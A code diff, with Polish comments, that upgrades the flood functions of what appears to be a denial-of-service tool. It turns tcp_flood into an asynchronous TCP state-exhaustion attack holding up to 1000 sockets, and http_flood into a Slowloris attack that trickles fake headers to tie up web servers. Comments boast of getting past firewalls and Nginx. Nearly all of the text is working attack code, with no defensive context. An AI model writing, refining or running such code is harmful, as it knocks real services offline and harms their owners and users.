@@ -96,23 +96,53 @@ void *tcp_flood(void *arg) {
     target.sin_port = htons(args->port);
     target.sin_addr.s_addr = inet_addr(args->ip);
 
-    char payload[1024];
-    for(int i = 0; i < 1024; i++) payload[i] = rand() % 255;
+    int max_sockets = 1000;
+    int *sockets = malloc(sizeof(int) * max_sockets);
+    for(int i = 0; i < max_sockets; i++) sockets[i] = 0;
 
+    // Prawdziwy TCP State Exhaustion (Sockstress / Slow read)
+    // Zamiast wysylac RST i pomagac firewallowi, trzymamy polaczenia asynchronicznie
     while(time(NULL) < attack_end_time && !stop_attack) {
-        int sock = socket(AF_INET, SOCK_STREAM, 0);
-        set_linger(sock); // Zapobiega TIME_WAIT
-        
-        int flag = 1;
-        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&flag, sizeof(int)); // Wylacza algorytm Nagle'a (pakiety leca instant)
-        
-        // Czysty Connection Flood: szybkie nawiazanie polaczenia i natychmiastowe zerwanie, omijamy zator (Congestion Control)
-        if(connect(sock, (struct sockaddr *)&target, sizeof(target)) == 0) {
-            // Wyczerpujemy tablice stanow firewalla bez wysylania gigabajtow smieci
-            send(sock, payload, 16, MSG_NOSIGNAL);
+        fd_set write_fds;
+        FD_ZERO(&write_fds);
+        int max_fd = 0;
+
+        for(int i = 0; i < max_sockets; i++) {
+            if(stop_attack) break;
+            
+            if(sockets[i] == 0) {
+                int sock = socket(AF_INET, SOCK_STREAM, 0);
+                u_long mode = 1;
+                ioctlsocket(sock, FIONBIO, &mode); // Non-blocking!
+                
+                connect(sock, (struct sockaddr *)&target, sizeof(target));
+                sockets[i] = sock;
+            }
+            
+            if(sockets[i] > 0) {
+                FD_SET(sockets[i], &write_fds);
+                if(sockets[i] > max_fd) max_fd = sockets[i];
+            }
         }
-        close(sock);
+
+        struct timeval tv = {0, 10000}; // 10ms
+        int activity = select(max_fd + 1, NULL, &write_fds, NULL, &tv);
+
+        if(activity > 0) {
+            for(int i = 0; i < max_sockets; i++) {
+                if(sockets[i] > 0 && FD_ISSET(sockets[i], &write_fds)) {
+                    // Powolne podtrzymywanie stanu z minimalnym narzutem na nasze CPU
+                    if(send(sockets[i], "\0", 1, MSG_NOSIGNAL) <= 0) {
+                        close(sockets[i]);
+                        sockets[i] = 0;
+                    }
+                }
+            }
+        }
     }
+    
+    for(int i = 0; i < max_sockets; i++) if(sockets[i] > 0) close(sockets[i]);
+    free(sockets);
     return NULL;
 }
 
@@ -123,23 +153,60 @@ void *http_flood(void *arg) {
     target.sin_port = htons(args->port);
     target.sin_addr.s_addr = inet_addr(args->ip);
 
+    int max_sockets = 1000;
+    int *sockets = malloc(sizeof(int) * max_sockets);
+    for(int i = 0; i < max_sockets; i++) sockets[i] = 0;
+
     char request[512];
     snprintf(request, sizeof(request), 
-             "GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n", 
+             "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nConnection: keep-alive\r\n", 
              args->ip);
-
     int req_len = strlen(request);
 
+    // Omijanie warstwy 7 - zamiast spamu i RST, robimy Slowloris asynchronicznie (select)
     while(time(NULL) < attack_end_time && !stop_attack) {
-        int sock = socket(AF_INET, SOCK_STREAM, 0);
-        set_linger(sock); // Zapobiega zapchaniu portów
-        
-        // Brak Pipeliningu - jedno zapytanie na gniazdo, w pelni zgodne z nowymi serwerami
-        if(connect(sock, (struct sockaddr *)&target, sizeof(target)) == 0) {
-            send(sock, request, req_len, MSG_NOSIGNAL);
+        fd_set write_fds;
+        FD_ZERO(&write_fds);
+        int max_fd = 0;
+
+        for(int i = 0; i < max_sockets; i++) {
+            if(stop_attack) break;
+            
+            if(sockets[i] == 0) {
+                int sock = socket(AF_INET, SOCK_STREAM, 0);
+                u_long mode = 1;
+                ioctlsocket(sock, FIONBIO, &mode);
+                
+                connect(sock, (struct sockaddr *)&target, sizeof(target));
+                sockets[i] = sock;
+                send(sockets[i], request, req_len, MSG_NOSIGNAL); // Wysylamy czesc naglowka
+            }
+            
+            if(sockets[i] > 0) {
+                FD_SET(sockets[i], &write_fds);
+                if(sockets[i] > max_fd) max_fd = sockets[i];
+            }
         }
-        close(sock);
+
+        struct timeval tv = {1, 0}; // Czekamy dluzej zeby Nginx myslal ze uzytkownik powoli pisze
+        int activity = select(max_fd + 1, NULL, &write_fds, NULL, &tv);
+
+        if(activity > 0) {
+            for(int i = 0; i < max_sockets; i++) {
+                if(sockets[i] > 0 && FD_ISSET(sockets[i], &write_fds)) {
+                    char fake_header[64];
+                    snprintf(fake_header, sizeof(fake_header), "X-a: %d\r\n", rand() % 10000);
+                    if(send(sockets[i], fake_header, strlen(fake_header), MSG_NOSIGNAL) <= 0) {
+                        close(sockets[i]);
+                        sockets[i] = 0;
+                    }
+                }
+            }
+        }
     }
+    
+    for(int i = 0; i < max_sockets; i++) if(sockets[i] > 0) close(sockets[i]);
+    free(sockets);
     return NULL;
 }
 
